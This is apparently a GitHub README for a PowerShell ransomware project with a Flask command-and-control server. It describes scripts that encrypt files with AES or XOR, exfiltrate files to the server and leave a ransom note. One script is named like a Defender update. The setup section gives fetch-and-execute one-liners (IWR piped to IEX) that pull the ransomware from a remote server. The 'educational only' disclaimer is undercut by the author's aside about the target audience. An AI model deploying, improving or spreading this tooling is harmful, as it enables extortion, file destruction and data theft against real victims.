<!-- display-subdirectories: false -->

# PowerShell-Ransomware

AES-256 and XOR-based PowerShell ransomware with customizability.

## Purpose
Both **0xLock** and **Rox** are meant for educational project demonstrating file encryption with Command-and-Control (C2) server integration. It simulates ransomware-like behavior using AES and XOR encryption, including file exfiltration and C2 communication, for learning purposes only.

⚠️ **Warning**: This project is for educational use only. The encryption methods (AES and XOR) are not secure for production due to simplified key management and inherent weaknesses (especially XOR). Not sure if my target audience cares...

## Description
This repository contains:
- **`heartbeat.ps1`**: A PowerShell script that encrypts files using AES-256, exfiltrates files (<1GB) to a C2 server, and beacons back with results.
- **`defender_update.ps1`**: A PowerShell script that encrypts files using xor, exfiltrates files to a C2 server, and beacons back with results.
- **`server.py`**: A Flask-based C2 server that handles payload delivery, file exfiltration, system info, file indexing, and beaconing.
- **`clean_exfil.sh`**: A bash script to purge all contents in `exfiltrated_files` and `exfiltrated_data` directory.

Files are encrypted in test directories (`C:\Temp\heartbeatDemo` for AES, `C:\Temp\roxDemo` for XOR) to avoid affecting real data.

## Usage

### Prerequisites
- **PowerShell Scripts**: Windows with PowerShell 5.1+.
- **Flask Server**: Python 3.6+, Flask (`pip install flask`), and network access (default: `10.0.0.128:80`).

### Setup

1. **Clone the Repository**:

```bash
git clone https://github.com/0x4F776C/PowerShell-Ransomware.git
cd PowerShell-Ransomware
```

2. **Run the Flask Server**:

```bash
pip install flask
python server.py
```

- If testing locally, update `$c2Server`` in both scripts to `127.0.0.1:5000`` and run the server with `app.run(host='0.0.0.0', port=5000, debug=True)``.

3. Run the PowerShell Scripts:

- For AES:

```powershell
IWR -Uri "http://<server ip>/files/heartbeat.ps1" -UseBasicParsing | IEX
```

- For XOR:

```powershell
IWR -Uri "http://<server ip>/files/defender_update.ps1" -UseBasicParsing | IEX
```

- Results: Encrypted files (`.0xlock` for AES, `.rox` for XOR), exfiltrated files in `exfiltrated_files/`, and a ransom note in the test directory.

### Future Plans

- Add more encryption methods (e.g., RSA for key exchange).
- Improve key management for the AES script (e.g., secure key storage).
- Enhance the C2 server with a web interface for monitoring.
- Include more robust error handling and logging.
- Add unit tests for both scripts and the server.

### License
This project is licensed under the MIT License. See the file for details.
Happy experimenting! 🚀